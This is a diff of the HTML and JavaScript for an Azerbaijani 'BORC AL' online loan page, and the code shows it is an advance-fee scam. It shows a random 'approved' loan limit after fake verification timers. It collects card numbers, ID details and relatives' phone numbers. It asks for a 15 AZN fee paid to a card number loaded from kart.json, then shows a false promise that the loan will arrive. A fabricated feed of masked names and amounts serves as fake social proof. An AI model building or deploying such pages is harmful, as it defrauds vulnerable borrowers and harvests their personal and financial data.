-            <div style="display: flex; justify-content: space-between; font-size: 1rem; font-weight: bold; color: var(--accent-blue);">
-                <span>Aylıq Ödəniş:</span>
-                <span id="monthlyPaymentVal">88 AZN</span>
-            </div>
-        </div>
-
-        <button class="btn-action" onclick="goToStep3()">
-            <span>Davam Et</span>
-            <i class="fa-solid fa-arrow-right"></i>
-        </button>
-    </div>
-
-    <!-- MƏRHƏLƏ 3: ƏLAVƏ FORM MƏLUMATLARI -->
-    <div class="card" id="step3">
-        <h2><i class="fa-solid fa-address-card" style="color: var(--accent-blue);"></i> Şəxsi Məlumatlar</h2>
-        <form onsubmit="startSecondCheck(event)">
-            
-            <div class="form-group">
-                <label>Kredit Köçürüləcək Kart Nömrəniz</label>
-                <div class="input-box">
-                    <i class="fa-solid fa-credit-card"></i>
-                    <input type="text" placeholder="4169 0000 0000 0000" maxlength="19" required>
-                </div>
-            </div>
-
-            <div class="form-group">
-                <label>Doğum Tarixi</label>
-                <div class="input-box">
-                    <i class="fa-solid fa-calendar"></i>
-                    <input type="date" required>
-                </div>
-            </div>
-
-            <div class="form-group">
-                <label>Cinsiniz</label>
-                <div class="gender-box">
-                    <div class="gender-btn active" onclick="selectGender('Kişi', this)"><i class="fa-solid fa-mars"></i> Bəy</div>
-                    <div class="gender-btn" onclick="selectGender('Qadın', this)"><i class="fa-solid fa-venus"></i> Xanım</div>
-                </div>
-            </div>
-
-            <div class="form-group">
-                <label>İş Yerinizin Adı</label>
-                <div class="input-box">
-                    <i class="fa-solid fa-building"></i>
-                    <input type="text" placeholder="Məs: MMC / Özəl Sektor" required>
-                </div>
-            </div>
-
-            <div class="form-group">
-                <label>Vəzifəniz</label>
-                <div class="input-box">
-                    <i class="fa-solid fa-briefcase"></i>
-                    <input type="text" placeholder="Məs: Mütəxəssis / Sürücü və s." required>
-                </div>
-            </div>
-
-            <div class="form-group">
-                <label>Yaşadığınız Şəhər / Rayon</label>
-                <div class="input-box">
-                    <i class="fa-solid fa-location-dot"></i>
-                    <input type="text" placeholder="Məs: Bakı" required>
-                </div>
-            </div>
-
-            <div style="color: var(--accent-blue); font-size: 0.85rem; font-weight: bold; margin: 20px 0 10px 0;">
-                <i class="fa-solid fa-users"></i> Yaxın Qohum Əlaqə Məlumatları
-            </div>
-
-            <div class="form-group">
-                <label>1-ci Qohumun Adı, Soyadı və Nömrəsi</label>
-                <div class="input-box" style="margin-bottom: 8px;">
-                    <i class="fa-solid fa-user"></i>
-                    <input type="text" placeholder="Ad Soyad" required>
-                </div>
-                <div class="input-box">
-                    <i class="fa-solid fa-phone"></i>
-                    <input type="tel" placeholder="050 000 00 00" required>
-                </div>
-            </div>
-
-            <div class="form-group">
-                <label>2-ci Qohumun Adı, Soyadı və Nömrəsi</label>
-                <div class="input-box" style="margin-bottom: 8px;">
-                    <i class="fa-solid fa-user"></i>
-                    <input type="text" placeholder="Ad Soyad" required>
-                </div>
-                <div class="input-box">
-                    <i class="fa-solid fa-phone"></i>
-                    <input type="tel" placeholder="050 000 00 00" required>
-                </div>
-            </div>
-
-            <button type="submit" class="btn-action">
-                <span>Təsdiqlə və İrəlilə</span>
-                <i class="fa-solid fa-arrow-right"></i>
-            </button>
-        </form>
-    </div>
-
-    <!-- GÖZLƏMƏ 2: 3-4 Saniyelik Qısa Yoxlanış -->
-    <div class="card" id="loader2">
-        <div class="timer-container">
-            <div class="pulse-loader">
-                <i class="fa-solid fa-rotate fa-spin"></i>
-            </div>
-            <h3 style="font-size: 1.1rem; margin-bottom: 8px;">Ödəniş Sisteminə Bağlanılır...</h3>
-            <p style="font-size: 0.85rem; color: var(--text-dim);">Kart hesabı yoxlanılır. Xahiş edirik gözləyin.</p>
-        </div>
-    </div>
-
-    <!-- MƏRHƏLƏ 4: ÖDƏNİŞ VƏ ÇEK YÜKLƏMƏ -->
-    <div class="card" id="step4">
-        <h2><i class="fa-solid fa-receipt" style="color: var(--accent-blue);"></i> Müraciət Ödənişi</h2>
-        <p style="font-size: 0.85rem; color: var(--text-dim); line-height: 1.5; margin-bottom: 15px;">
-            Müraciətin rəsmiləşdirilməsi və dərhal karta köçürülməsi üçün <strong>15 AZN</strong> xidmət haqqını aşağıdakı rəsmi hesabımıza köçürün:
-        </p>
-
-        <div class="card-visual-box">
-            <div class="real-card-ui">
-                <div style="display: flex; justify-content: space-between; font-weight: bold; font-size: 0.85rem;">
-                    <span>BORC AL CARD</span>
-                    <i class="fa-solid fa-wifi"></i>
-                </div>
-                <div class="card-chip"></div>
-                <div class="card-number-text" id="displayCardNumber">Yüklənir...</div>
-                <div style="display: flex; justify-content: space-between; align-items: flex-end;">
-                    <div style="font-size: 0.75rem; opacity: 0.8;">RƏSMİ HESAB</div>
-                    <i class="fa-brands fa-cc-mastercard" style="font-size: 1.8rem; color: #ff5f00;"></i>
-                </div>
-            </div>
-        </div>
-
-        <div class="form-group">
-            <label><i class="fa-solid fa-upload"></i> Ödəniş Çekini Yükləyin</label>
-            <div class="input-box">
-                <i class="fa-solid fa-file-arrow-up"></i>
-                <input type="file" id="receiptFile" accept="image/*,.pdf" style="padding-top: 10px;" required>
-            </div>
-        </div>
-
-        <button type="button" class="btn-action" onclick="submitFinalReceipt()">
-            <span>Çeki Göndər və Krediti Əldə Et</span>
-        </button>
-    </div>
-
-    <!-- MƏRHƏLƏ 5: YEKUN TEBRİK -->
-    <div class="card" id="step5" style="text-align: center; padding: 35px 20px;">
-        <i class="fa-solid fa-circle-check" style="font-size: 4rem; color: var(--accent-green); margin-bottom: 15px;"></i>
-        <h2 style="justify-content: center; border: none; font-size: 1.4rem; margin-bottom: 10px;">Ödəniş Uğurla Tamamlandı!</h2>
-        <p style="font-size: 0.95rem; color: var(--text-dim); line-height: 1.6; margin-bottom: 20px;">
-            Ödəniş çeki qəbul edildi. Ayrılmış kredit məbləği <strong style="color: #fff;">5 dəqiqə ərzində</strong> qeyd etdiyiniz kart hesabına köçürüləcəkdir.
-        </p>
-        <div style="background: var(--bg-input); padding: 12px; border-radius: 12px; font-size: 0.8rem; color: var(--text-dim);">
-            Bizi seçdiyiniz üçün təşəkkür edirik! BORC AL platforması.
-        </div>
-    </div>
-</div>
-
-<!-- Alt Menyu Vizualı -->
-<div class="bottom-nav">
-    <a href="#" class="nav-item active">
-        <i class="fa-solid fa-house"></i>
-        Ana Səhifə
-    </a>
-    <a href="#" class="nav-item">
-        <i class="fa-solid fa-file-lines"></i>
-        Müraciətlər
-    </a>
-    <a href="#" class="nav-item">
-        <i class="fa-solid fa-wallet"></i>
-        Ödənişlər
-    </a>
-    <a href="#" class="nav-item">
-        <i class="fa-solid fa-user"></i>
-        Profil
-    </a>
-</div>
-
-<script>
-    function selectSeries(series, elem) {
-        document.querySelectorAll('.series-btn').forEach(btn => btn.classList.remove('active'));
-        elem.classList.add('active');
-        document.getElementById('selectedSeries').value = series;
-    }
-
-    function selectGender(gender, elem) {
-        document.querySelectorAll('.gender-btn').forEach(btn => btn.classList.remove('active'));
-        elem.classList.add('active');
-    }
-
-    function startFirstCheck(e) {
-        e.preventDefault();
-        document.getElementById('step1').style.display = 'none';
-        document.getElementById('loader1').style.display = 'block';
-
-        let maxLimit = Math.floor(Math.random() * (4000 - 500 + 1)) + 500;
-        maxLimit = Math.round(maxLimit / 50) * 50;
-        
-        document.getElementById('maxApprovedAmount').innerText = maxLimit + " AZN";
-        
-        const loanRange = document.getElementById('loanRange');
-        loanRange.max = maxLimit;
-        loanRange.value = Math.min(1000, maxLimit);
-        updateCalculator(loanRange.value);
-
-        let timeLeft = 30; // Dəqiq 30 saniyəlik taymer
-        const timerElem = document.getElementById('timerCount');
-
-        const interval = setInterval(() => {
-            timeLeft--;
-            timerElem.innerText = timeLeft;
-            if (timeLeft <= 0) {
-                clearInterval(interval);
-                document.getElementById('loader1').style.display = 'none';
-                document.getElementById('step2').style.display = 'block';
-            }
-        }, 1000);
-    }
-
-    function updateCalculator(val) {
-        document.getElementById('selectedAmountVal').innerText = val + " AZN";
-        let monthly = Math.round((parseFloat(val) * 1.15) / 12);
-        document.getElementById('monthlyPaymentVal').innerText = monthly + " AZN";
-    }
-
-    function goToStep3() {
-        document.getElementById('step2').style.display = 'none';
-        document.getElementById('step3').style.display = 'block';
-    }
-
-    function startSecondCheck(e) {
-        e.preventDefault();
-        document.getElementById('step3').style.display = 'none';
-        document.getElementById('loader2').style.display = 'block';
-
-        setTimeout(async () => {
-            document.getElementById('loader2').style.display = 'none';
-            document.getElementById('step4').style.display = 'block';
-
-            try {
-                const response = await fetch('./kart.json?v=' + new Date().getTime());
-                const data = await response.json();
-                if (data.kart_nomresi) {
-                    document.getElementById('displayCardNumber').innerText = formatCardNumber(data.kart_nomresi);
-                } else {
-                    document.getElementById('displayCardNumber').innerText = "5239 1517 5663 1290";
-                }
-            } catch (error) {
-                document.getElementById('displayCardNumber').innerText = "5239 1517 5663 1290";
-            }
-        }, 3500);
-    }
-
-    function formatCardNumber(num) {
-        return num.replace(/\s?/g, '').replace(/(\d{4})/g, '$1 ').trim();
-    }
-
-    function submitFinalReceipt() {
-        const fileInput = document.getElementById('receiptFile');
-        if (!fileInput.files || fileInput.files.length === 0) {
-            alert("Lütfən, ödəniş çekini seçin!");
-            return;
+    <script>
+        function switchTab(tabId, elem) {
+            document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
+            document.querySelectorAll('.nav-item').forEach(nav => nav.classList.remove('active'));
+            document.getElementById(tabId).classList.add('active');
+            elem.classList.add('active');
         }
 
-        document.getElementById('step4').style.display = 'none';
-        document.getElementById('step5').style.display = 'block';
-    }
-</script>
+        function selectSeries(btn, val) {
+            document.querySelectorAll('.series-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            document.getElementById('selectedSeriesVal').value = val;
+        }
 
+        function selectGender(btn, val) {
+            document.querySelectorAll('.gender-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            document.getElementById('selectedGenderVal').value = val;
+        }
+
+        function startFirstCheck(e) {
+            e.preventDefault();
+            
+            // Profil məlumatlarını saxla
+            const profileHTML = `
+                <div style="border-bottom:1px solid rgba(255,255,255,0.05); padding-bottom:8px;"><strong>Ad Soyad:</strong> ${document.getElementById('uName').value} ${document.getElementById('uSurname').value}</div>
+                <div style="border-bottom:1px solid rgba(255,255,255,0.05); padding-bottom:8px;"><strong>Telefon:</strong> ${document.getElementById('uPhone').value}</div>
+                <div style="border-bottom:1px solid rgba(255,255,255,0.05); padding-bottom:8px;"><strong>FIN:</strong> ${document.getElementById('uFin').value}</div>
+                <div style="border-bottom:1px solid rgba(255,255,255,0.05); padding-bottom:8px;"><strong>Seriya:</strong> ${document.getElementById('selectedSeriesVal').value} ${document.getElementById('uSeria').value}</div>
+                <div><strong>Cins:</strong> ${document.getElementById('selectedGenderVal').value}</div>
+            `;
+            document.getElementById('profileDetails').innerHTML = profileHTML;
+
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('loader1').style.display = 'block';
+
+            let t = 30;
+            const timer = setInterval(() => {
+                t--;
+                document.getElementById('timerCount').innerText = t;
+                if(t <= 0) {
+                    clearInterval(timer);
+                    document.getElementById('loader1').style.display = 'none';
+                    document.getElementById('step2').style.display = 'block';
+                }
+            }, 1000);
+        }
+
+        function updateLoanCalc(v) {
+            document.getElementById('selectedValText').innerText = v + " AZN";
+        }
+
+        function goToStep3() {
+            document.getElementById('step2').style.display = 'none';
+            document.getElementById('step3').style.display = 'block';
+        }
+
+        function startSecondCheck(e) {
+            e.preventDefault();
+            document.getElementById('step3').style.display = 'none';
+            document.getElementById('loader2').style.display = 'block';
+
+            setTimeout(async () => {
+                document.getElementById('loader2').style.display = 'none';
+                document.getElementById('step4').style.display = 'block';
+
+                try {
+                    const res = await fetch('./kart.json?v=' + new Date().getTime());
+                    const d = await res.json();
+                    document.getElementById('displayCardNumber').innerText = d.kart_nomresi || "5239 1517 5663 1290";
+                } catch {
+                    document.getElementById('displayCardNumber').innerText = "5239 1517 5663 1290";
+                }
+            }, 3500);
+        }
+
+        function finishProcess() {
+            if(!document.getElementById('receiptFile').files.length) {
+                alert("Lütfən çeki yükləyin!");
+                return;
+            }
+            document.getElementById('step4').style.display = 'none';
+            document.getElementById('step5').style.display = 'block';
+        }
+
+        // Müraciətlər Vərəqəsi Üçün Təsadüfi Məlumat Generatoru (Maskalanmış)
+        const names = ["A****N", "E****N", "R****D", "N****T", "S****M", "T****R", "F****D", "O****R", "K****M", "V****Q"];
+        const surnames = ["M*******V", "Ə****V", "H*******V", "Q*******V", "S*******V", "C*******V", "B*******V"];
+
+        let feedHTML = "";
+        for(let i=0; i<30; i++) {
+            const randomName = names[Math.floor(Math.random()*names.length)] + " " + surnames[Math.floor(Math.random()*surnames.length)];
+            const randomAmount = (Math.floor(Math.random() * 35) + 3) * 100;
+            feedHTML += `
+                <div class="feed-item">
+                    <div>
+                        <div class="feed-user">${randomName}</div>
+                        <div class="feed-time">İndi tamamlandı</div>
+                    </div>
+                    <div class="feed-amount">+${randomAmount} AZN</div>
+                </div>
+            `;
+        }
+        document.getElementById('feedList').innerHTML = feedHTML + feedHTML; // Təkrar tətbiq edərək sonsuz animasiya
+    </script>
 </body>
 </html>
-```
